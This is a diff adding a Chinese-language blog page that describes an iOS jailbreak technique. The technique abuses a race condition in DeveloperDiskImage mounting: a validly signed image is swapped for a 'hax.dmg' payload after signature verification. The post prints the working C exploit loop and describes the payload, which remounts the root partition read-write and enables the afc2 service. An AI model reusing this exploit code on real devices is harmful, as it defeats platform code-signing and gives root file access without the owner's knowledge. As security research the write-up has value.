@@ -1,0 +1,317 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+###DeveloperDiskImage:   
+给iOS开发使用的镜像； 一开始不知道是干嘛用的，在Mac里找了一下，发现从6.0～9.1每个iOS的SDK版本都有一个DDI；  
+可以打开dmg看一下，发现里面的目录结构都相似，简单看一下可以发现Lockdown/ServiceAgents下一些常用的东西如DebugServer,Instruments,GPUTools等；  
+由此可以确定这个dmg是在iOS开发中将挂载到iOS系统上；
+
+###Race Condition:   
+从Mac上存储DDI的位置来看，每个DDI都有自己对应的signature，只有通过了签名校验，才能挂载到iOS 设备上；  
+race condition绕过这个签名校验的方法就是，使用正确的dmg和正确的sig文件通过签名校验，在通过签名校验后、真正挂载dmg之间的某个时间点，把dmg文件替换掉。  
+
+##遇到的问题:   
+照着P0sixspwn的代码，把其中DDI的部分重新实现了一遍，遇到了几个小问题：  
+1. 一些mmap相关的函数遇到了undefined的错误，include<sys/mman.h>  
+2. common.h中添加MobileDevice.h; configuare.ac中需要添加CoreFondation相关的framework  
+3. 挂接镜像的时候，一开始我是直接在开着设备的情况下挂接，一直挂接失败；即使挂接正确的镜像依然失败，没有任何输出能告知原因；这时候想到可以查看Xcode的设备日志；从日志可以看出原因：/Developer 目录已经有镜像挂接，无法再挂接镜像；这里可以猜出这个ddi挂接的机理，通过usb连上电脑时，自动挂接，断开usb时，移除镜像；  
+
+##修改后的代码:   
+基本思路就是从1000us～4000us，以100us为步长去尝试，找到mount成功的那个时间点；  
+我这里只对race condition部分做实验的话，需要在设备未挂接ddi的情况下实验，所以要做一次重启操作，再启动之后开启程序监听启动的通知即可；  
+挂接成功后，xcode的device里面可以看到"An error was encountered while enabling development on this device"  
+这里只给出关键部分  
+
+	static void cb2(am_device_notification_callback_info *info, void *foo) {
+
+    static char* ddi_dmg = "../payload/hax.dmg";
+    static char* real_dmg = "../payload/iOSUpdaterHelper.dmg";
+    static char* real_dmg_signature = "../payload/iOSUpdaterHelper.dmg.signature";
+    
+    timesl = 1000;
+    
+    struct am_device *dev;
+    if (is_ddid)
+        CFRunLoopStop(CFRunLoopGetCurrent());
+    
+    if (info->msg == ADNCI_MSG_CONNECTED) {
+        DEBUG("C0nnected...\n");
+        dev = info->dev;
+        AMDeviceConnect(dev);
+        assert(AMDeviceIsPaired(dev));
+        assert(!AMDeviceValidatePairing(dev));
+        assert(!AMDeviceStartSession(dev));
+
+        service_conn_t afc_socket = 0;
+        struct afc_connection *afc = NULL;
+        
+	Retry:  
+        assert(!AMDeviceStartService(dev, CFSTR("com.apple.afc"), &afc_socket, NULL));
+        assert(!AFCConnectionOpen(afc_socket, 0, &afc));
+        assert(!AFCDirectoryCreate(afc, "PublicStaging"));
+
+        AFCRemovePath(afc, "PublicStaging/staging.dimage");
+        qwrite(afc, real_dmg, "PublicStaging/staging.dimage");
+        qwrite(afc, ddi_dmg, "PublicStaging/ddi.dimage");
+
+        service_conn_t mim_socket1 = 0;
+        assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &mim_socket1, NULL));
+        assert(mim_socket1);
+
+        CFPropertyListRef result = NULL;
+        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
+        CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));
+        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/private/var/mobile/Media/PublicStaging/staging.dimage"));
+
+        int fd = open(real_dmg_signature, O_RDONLY);
+        assert(fd != -1);
+        uint8_t sig[128];
+        assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
+        close(fd);
+        CFDictionarySetValue(dict, CFSTR("ImageSignature"), CFDataCreateWithBytesNoCopy(NULL, sig, sizeof(sig), kCFAllocatorNull));
+
+        send_message(mim_socket1, dict);
+
+        if (ddi_dmg) {
+            DEBUG("sleep %d\n", timesl);
+            usleep(timesl);
+            assert(!AFCRenamePath(afc, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));
+        }
+
+        DEBUG("receive 1:\n");
+        result = receive_message(mim_socket1);
+        print_data(CFPropertyListCreateXMLData(NULL, result));
+
+        tries++;
+        if (tries >= 30) {
+            is_ddid = -1;
+            DEBUG("retry 30 times failed\n");
+            return;
+        }
+
+        if (strstr(CFDataGetBytePtr(CFPropertyListCreateXMLData(NULL, result)), "ImageMountFailed")) {
+            timesl += 100;
+            goto Retry;
+        }
+
+        DEBUG("Mount Success!\n");
+        is_ddid = 1;
+        CFRunLoopStop(CFRunLoopGetCurrent());
+        fflush(stdout);
+      }
+    }
+###hax.dmg:   
+hax这个被替代的镜像的目录结构里，有内容的只有LockDown/ServiceAgents这个目录，里面是两个plist文件，LockDown可以通过这个plist的内容加载相应的命令； 有意思的是，LockDown这个程序它是有root权限的； 一开始想不通到底为什么，后来看了ddi中的plist就明白了，像debugserver、instrument这种工具，需要root权限才能实现；  
+这里的hax镜像内的内容是两个，一个是mount root分区为可读写， 一个是配置afc2服务；  
+通过LockDown启动这两个服务，就可以访问和读写root分区，算是实现了沙箱逃逸吧～
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h3 id="developerdiskimage">DeveloperDiskImage:</h3>
+
+<p>给iOS开发使用的镜像； 一开始不知道是干嘛用的，在Mac里找了一下，发现从6.0～9.1每个iOS的SDK版本都有一个DDI； <br>
+可以打开dmg看一下，发现里面的目录结构都相似，简单看一下可以发现Lockdown/ServiceAgents下一些常用的东西如DebugServer,Instruments,GPUTools等； <br>
+由此可以确定这个dmg是在iOS开发中将挂载到iOS系统上；</p>
+
+<h3 id="racecondition">Race Condition:</h3>
+
+<p>从Mac上存储DDI的位置来看，每个DDI都有自己对应的signature，只有通过了签名校验，才能挂载到iOS 设备上； <br>
+race condition绕过这个签名校验的方法就是，使用正确的dmg和正确的sig文件通过签名校验，在通过签名校验后、真正挂载dmg之间的某个时间点，把dmg文件替换掉。  </p>
+
+<h2 id="">遇到的问题:</h2>
+
+<p>照着P0sixspwn的代码，把其中DDI的部分重新实现了一遍，遇到了几个小问题： <br>
+1. 一些mmap相关的函数遇到了undefined的错误，include<sys mman.h=""> <br>
+2. common.h中添加MobileDevice.h; configuare.ac中需要添加CoreFondation相关的framework <br>
+3. 挂接镜像的时候，一开始我是直接在开着设备的情况下挂接，一直挂接失败；即使挂接正确的镜像依然失败，没有任何输出能告知原因；这时候想到可以查看Xcode的设备日志；从日志可以看出原因：/Developer 目录已经有镜像挂接，无法再挂接镜像；这里可以猜出这个ddi挂接的机理，通过usb连上电脑时，自动挂接，断开usb时，移除镜像；  </sys></p>
+
+<h2 id="">修改后的代码:</h2>
+
+<p>基本思路就是从1000us～4000us，以100us为步长去尝试，找到mount成功的那个时间点； <br>
+我这里只对race condition部分做实验的话，需要在设备未挂接ddi的情况下实验，所以要做一次重启操作，再启动之后开启程序监听启动的通知即可； <br>
+挂接成功后，xcode的device里面可以看到"An error was encountered while enabling development on this device" <br>
+这里只给出关键部分  </p>
+
+<pre><code>static void cb2(am_device_notification_callback_info *info, void *foo) {
+
+static char* ddi_dmg = "../payload/hax.dmg";
+static char* real_dmg = "../payload/iOSUpdaterHelper.dmg";
+static char* real_dmg_signature = "../payload/iOSUpdaterHelper.dmg.signature";
+
+timesl = 1000;
+
+struct am_device *dev;
+if (is_ddid)
+    CFRunLoopStop(CFRunLoopGetCurrent());
+
+if (info-&gt;msg == ADNCI_MSG_CONNECTED) {
+    DEBUG("C0nnected...\n");
+    dev = info-&gt;dev;
+    AMDeviceConnect(dev);
+    assert(AMDeviceIsPaired(dev));
+    assert(!AMDeviceValidatePairing(dev));
+    assert(!AMDeviceStartSession(dev));
+
+    service_conn_t afc_socket = 0;
+    struct afc_connection *afc = NULL;
+
+Retry:  
+    assert(!AMDeviceStartService(dev, CFSTR("com.apple.afc"), &amp;afc_socket, NULL));
+    assert(!AFCConnectionOpen(afc_socket, 0, &amp;afc));
+    assert(!AFCDirectoryCreate(afc, "PublicStaging"));
+
+    AFCRemovePath(afc, "PublicStaging/staging.dimage");
+    qwrite(afc, real_dmg, "PublicStaging/staging.dimage");
+    qwrite(afc, ddi_dmg, "PublicStaging/ddi.dimage");
+
+    service_conn_t mim_socket1 = 0;
+    assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &amp;mim_socket1, NULL));
+    assert(mim_socket1);
+
+    CFPropertyListRef result = NULL;
+    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &amp;kCFTypeDictionaryKeyCallBacks, &amp;kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
+    CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));
+    CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/private/var/mobile/Media/PublicStaging/staging.dimage"));
+
+    int fd = open(real_dmg_signature, O_RDONLY);
+    assert(fd != -1);
+    uint8_t sig[128];
+    assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
+    close(fd);
+    CFDictionarySetValue(dict, CFSTR("ImageSignature"), CFDataCreateWithBytesNoCopy(NULL, sig, sizeof(sig), kCFAllocatorNull));
+
+    send_message(mim_socket1, dict);
+
+    if (ddi_dmg) {
+        DEBUG("sleep %d\n", timesl);
+        usleep(timesl);
+        assert(!AFCRenamePath(afc, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));
+    }
+
+    DEBUG("receive 1:\n");
+    result = receive_message(mim_socket1);
+    print_data(CFPropertyListCreateXMLData(NULL, result));
+
+    tries++;
+    if (tries &gt;= 30) {
+        is_ddid = -1;
+        DEBUG("retry 30 times failed\n");
+        return;
+    }
+
+    if (strstr(CFDataGetBytePtr(CFPropertyListCreateXMLData(NULL, result)), "ImageMountFailed")) {
+        timesl += 100;
+        goto Retry;
+    }
+
+    DEBUG("Mount Success!\n");
+    is_ddid = 1;
+    CFRunLoopStop(CFRunLoopGetCurrent());
+    fflush(stdout);
+  }
+}
+</code></pre>
+
+<h3 id="haxdmg">hax.dmg:</h3>
+
+<p>hax这个被替代的镜像的目录结构里，有内容的只有LockDown/ServiceAgents这个目录，里面是两个plist文件，LockDown可以通过这个plist的内容加载相应的命令； 有意思的是，LockDown这个程序它是有root权限的； 一开始想不通到底为什么，后来看了ddi中的plist就明白了，像debugserver、instrument这种工具，需要root权限才能实现； <br>
+这里的hax镜像内的内容是两个，一个是mount root分区为可读写， 一个是配置afc2服务； <br>
+通过LockDown启动这两个服务，就可以访问和读写root分区，算是实现了沙箱逃逸吧～</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "ddi_rc.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
